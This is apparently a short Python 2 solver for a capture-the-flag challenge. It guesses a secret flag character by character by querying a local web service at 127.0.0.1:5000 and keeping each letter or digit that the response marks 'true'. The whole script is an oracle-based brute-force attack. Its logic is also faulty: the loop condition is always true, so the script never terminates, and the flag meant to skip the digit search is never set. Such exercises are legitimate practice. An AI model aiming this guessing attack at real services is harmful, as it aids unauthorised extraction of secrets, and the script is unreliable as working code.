import string
import requests

flag = []
find = False
test="true"

while("true" or "false" not in test):

	for letter in list(string.ascii_lowercase):
		req = requests.get("http://127.0.0.1:5000/?flag="+"".join(flag)+letter)
		test = req.text
		if "true" in req.text:
			flag.append(letter)
			#find = True
	if not find:
		for num in list(string.digits):
			req = requests.get("http://127.0.0.1:5000/?flag="+"".join(flag)+num)
			test = req.text
			if "true" in req.text:
				flag.append(num)
	#find = False
	print "".join(flag)
